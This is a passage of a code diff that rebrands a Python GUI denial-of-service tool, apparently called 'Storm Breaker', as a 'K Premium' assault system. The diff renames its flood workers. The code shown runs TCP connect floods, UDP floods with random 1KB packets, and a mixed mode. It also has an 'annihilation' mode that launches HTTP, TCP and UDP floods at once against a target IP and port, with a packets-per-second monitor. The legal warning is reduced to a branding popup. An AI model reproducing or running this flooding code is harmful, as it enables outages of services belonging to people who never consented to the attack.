-                        self.stats['bytes_sent'] += 500  # Approximate request size
-                        
+                        self.stats['bytes_sent'] += 500
                 except Exception:
                     self.stats['packets_sent'] += 1
-                    
-                # High frequency - minimal delay
                 await asyncio.sleep(0.001)
     
-    async def _tcp_flood_worker(self, worker_id, target_ip, target_port):
-        """TCP SYN flood worker"""
+    async def _tcp_assault_unit(self, unit_id, target_ip, target_port):
+        """TCP assault unit"""
         while self.attacking:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -335,49 +571,44 @@ class StormBreakerGUI:
                 sock.connect((target_ip, target_port))
                 sock.close()
                 self.stats['packets_sent'] += 1
-                self.stats['bytes_sent'] += 60  # Approximate TCP packet size
+                self.stats['bytes_sent'] += 60
             except Exception:
                 self.stats['packets_sent'] += 1
-                
             await asyncio.sleep(0.001)
     
-    async def _udp_flood_worker(self, worker_id, target_ip, target_port):
-        """UDP flood worker"""
+    async def _udp_assault_unit(self, unit_id, target_ip, target_port):
+        """UDP assault unit"""
         while self.attacking:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                data = os.urandom(1024)  # 1KB packets
+                data = os.urandom(1024)
                 sock.sendto(data, (target_ip, target_port))
                 sock.close()
                 self.stats['packets_sent'] += 1
                 self.stats['bytes_sent'] += len(data)
             except Exception:
                 self.stats['packets_sent'] += 1
-                
             await asyncio.sleep(0.001)
     
-    async def _mixed_worker(self, worker_id, target_ip, target_port):
-        """Mixed attack worker"""
-        attack_methods = [self._http_flood_worker, self._tcp_flood_worker, self._udp_flood_worker]
-        
+    async def _mixed_assault_unit(self, unit_id, target_ip, target_port):
+        """Mixed assault unit"""
+        methods = [self._http_assault_unit, self._tcp_assault_unit, self._udp_assault_unit]
         while self.attacking:
-            method = random.choice(attack_methods)
-            await method(worker_id, target_ip, target_port)
+            method = random.choice(methods)
+            await method(unit_id, target_ip, target_port)
     
-    async def _max_destruction_worker(self, worker_id, target_ip, target_port):
-        """Maximum destruction worker - uses all methods"""
+    async def _annihilation_unit(self, unit_id, target_ip, target_port):
+        """Annihilation unit"""
         while self.attacking:
-            # Run all methods concurrently
             tasks = [
-                self._http_flood_worker(worker_id, target_ip, target_port),
-                self._tcp_flood_worker(worker_id, target_ip, target_port),
-                self._udp_flood_worker(worker_id, target_ip, target_port)
+                self._http_assault_unit(unit_id, target_ip, target_port),
+                self._tcp_assault_unit(unit_id, target_ip, target_port),
+                self._udp_assault_unit(unit_id, target_ip, target_port)
             ]
-            
             await asyncio.gather(*tasks, return_exceptions=True)
     
-    async def _stats_monitor(self):
-        """Monitor and update statistics"""
+    async def _premium_monitor(self):
+        """Premium monitoring system"""
         last_packets = 0
         last_time = time.time()
         
@@ -393,35 +624,35 @@ class StormBreakerGUI:
             if elapsed > 0:
                 self.stats['current_pps'] = int(packets_sent / elapsed)
                 
-                # Log performance
-                if self.stats['current_pps'] > TARGET_PPS * 0.8:
-                    self.log_message(f"✅ Excellent performance: {self.stats['current_pps']:,} PPS")
+                # Log performance achievements
+                if self.stats['current_pps'] > TARGET_PPS * 0.9:
+                    self.log_message(f"🎯 PEAK PERFORMANCE: {self.stats['current_pps']:,} PPS", "SUCCESS")
                 elif self.stats['current_pps'] < TARGET_PPS * 0.3:
-                    self.log_message(f"⚠️  Low performance: {self.stats['current_pps']:,} PPS")
+                    self.log_message(f"⚠️  PERFORMANCE DEGRADED: {self.stats['current_pps']:,} PPS", "WARNING")
             
             last_packets = current_packets
             last_time = current_time
 
 def main():
-    """Main application entry point"""
-    # Check for dependencies
+    """Premium application entry point"""
     try:
         import matplotlib
         import aiohttp
     except ImportError as e:
-        print(f"❌ Missing dependency: {e}")
-        print("💡 Install with: pip install matplotlib aiohttp fake-useragent")
+        print(f"❌ MISSING DEPENDENCY: {e}")
+        print("💡 INSTALL WITH: pip install matplotlib aiohttp fake-useragent psutil")
         return
     
-    # Create and run GUI
+    # Create premium application
     root = tk.Tk()
-    app = StormBreakerGUI(root)
+    app = KLuxuryGUI(root)
     
-    # Legal warning
-    messagebox.showwarning("Legal Warning", 
-                          "STORM BREAKER DDoS TOOL - FOR EDUCATIONAL USE ONLY\n\n"
-                          "Only use on systems you own or have explicit permission to test.\n"
-                          "Unauthorized use may be illegal in your jurisdiction.")
+    # Show premium warning
+    messagebox.showwarning("K - PREMIUM ASSAULT SYSTEM", 
+                          "K PREMIUM DDoS TOOL v21.0\n\n"
+                          "FOR AUTHORIZED TESTING ONLY\n"
+                          "UNAUTHORIZED USE STRICTLY PROHIBITED\n\n"
+                          "© K SECURITY SYSTEMS")
     
     root.mainloop()
 
